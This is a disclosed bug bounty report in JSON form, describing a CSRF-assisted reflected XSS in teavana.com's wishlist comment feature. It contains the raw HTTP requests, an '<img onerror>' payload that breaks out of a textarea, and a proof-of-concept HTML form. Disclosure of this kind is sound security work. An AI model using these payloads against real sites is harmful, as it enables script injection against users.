{"id":177508,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc1MDg=","url":"https://hackerone.com/reports/177508","title":"Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-10-22T10:40:41.332Z","submitted_at":"2016-10-22T10:40:41.332Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"faisalahmed","url":"/faisalahmed","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-13T22:48:34.665Z","bug_reporter_agreed_on_going_public_at":"2017-02-09T10:11:49.783Z","team_member_agreed_on_going_public_at":"2017-02-13T22:48:34.625Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"User can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:\n\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=:comment_string\n```\nThe value of the `wishlistComment` reflects on the returned HTML snippet as bellow:\n\n```html\n\u003ctextarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\"\u003e\n:comment_string\n\u003c/textarea\u003e\n```\n\nBut the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.\n\n**vulnerable post**\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=\u003c/textarea\u003e\u003cimg+src=x+onerror=alert(1)\u003e\n```\n**Response**\n```html\n\u003ctextarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\"\u003e\n\u003c/textarea\u003e\u003cimg src=x onerror=alert(1)\u003e\n\u003c/textarea\u003e\n```\n\nThere is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.\n\n**CSRF to XSS PoC**\n\n```html\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"wishlistComment\" value=\"\u0026lt;\u0026#47;textarea\u0026gt;\u0026lt;img\u0026#32;src\u0026#61;x\u0026#32;onerror\u0026#61;alert\u0026#40;1\u0026#41;\u0026gt;\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nReplace the `:id` with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.\n\n{F129593}","vulnerability_information_html":"\u003cp\u003eUser can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ewww.teavana.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etext/html, */*; q=0.01\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate, br\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eReferer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ehttps://www.teavana.com/us/en/my-wishlist\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e55\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eREDACTED\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\nwishlistComment=:comment_string\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe value of the \u003ccode\u003ewishlistComment\u003c/code\u003e reflects on the returned HTML snippet as bellow:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;textarea\u003c/span\u003e \u003cspan class=\"na\"\u003emaxlength=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonkeyup=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;return ismaxlength(this);\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wishlistComment\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wishlistComment\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ecols=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;60\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erows=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;12\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n:comment_string\n\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003evulnerable post\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ewww.teavana.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etext/html, */*; q=0.01\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate, br\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eReferer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ehttps://www.teavana.com/us/en/my-wishlist\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e55\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eREDACTED\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\nwishlistComment=\u0026lt;/textarea\u0026gt;\u0026lt;img+src=x+onerror=alert(1)\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;textarea\u003c/span\u003e \u003cspan class=\"na\"\u003emaxlength=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonkeyup=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;return ismaxlength(this);\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wishlistComment\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wishlistComment\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ecols=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;60\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erows=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;12\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u003c/span\u003e \u003cspan class=\"na\"\u003eonerror=\u003c/span\u003e\u003cspan class=\"s\"\u003ealert(1)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eCSRF to XSS PoC\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wishlistComment\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;lt;\u0026amp;#47;textarea\u0026amp;gt;\u0026amp;lt;img\u0026amp;#32;src\u0026amp;#61;x\u0026amp;#32;onerror\u0026amp;#61;alert\u0026amp;#40;1\u0026amp;#41;\u0026amp;gt;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eReplace the \u003ccode\u003e:id\u003c/code\u003e with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"xssed.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?response-content-disposition=attachment%3B%20filename%3D%22xssed.png%22%3B%20filename%2A%3DUTF-8%27%27xssed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T044343Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026amp;X-Amz-Signature=9ce1c4fa8f8c0da63f094134988dfc8e4126622dfcc45323058f2305b6777c53\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?response-content-disposition=attachment%3B%20filename%3D%22xssed.png%22%3B%20filename%2A%3DUTF-8%27%27xssed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T044343Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026amp;X-Amz-Signature=9ce1c4fa8f8c0da63f094134988dfc8e4126622dfcc45323058f2305b6777c53\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"375.0","formatted_bounty":"$375","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":129593,"file_name":"xssed.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?response-content-disposition=attachment%3B%20filename%3D%22xssed.png%22%3B%20filename%2A%3DUTF-8%27%27xssed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044343Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=9ce1c4fa8f8c0da63f094134988dfc8e4126622dfcc45323058f2305b6777c53","file_size":1237626,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-11T10:11:49.821Z","allow_singular_disclosure_after":-119989913.94935559,"singular_disclosure_allowed":true,"vote_count":22,"voters":["hunter","tripwire","fizhimchik","spam404","jon_bottarini","mpz","eveeez","khizer47","sup3r-b0y","sumit7","and 12 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1265497,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hey @faisalahmed \n\nThank you for your submission. However, this has been previously reported to us by another researcher. We appreciate all your efforts and we hope to receive more reports from you in the future.\n\nThanks! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. However, this has been previously reported to us by another researcher. We appreciate all your efforts and we hope to receive more reports from you in the future.\u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-24T22:07:48.784Z","updated_at":"2016-10-24T22:07:48.784Z","original_report_id":174986,"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265498,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There are two XSS in wishlist comment module. One is a stored xss, triggers when user tries to edit the comment and another is the reflected xss triggers when user exploits the existing csrf vulnerability and post payload.\n\nAre you sure they are same?","markdown_message":"\u003cp\u003eThere are two XSS in wishlist comment module. One is a stored xss, triggers when user tries to edit the comment and another is the reflected xss triggers when user exploits the existing csrf vulnerability and post payload.\u003c/p\u003e\n\n\u003cp\u003eAre you sure they are same?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-24T22:09:44.990Z","updated_at":"2016-10-24T22:10:19.265Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265672,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-24T23:48:32.401Z","updated_at":"2016-10-24T23:48:32.401Z","additional_data":{"old_title":"Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module.","new_title":"Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. 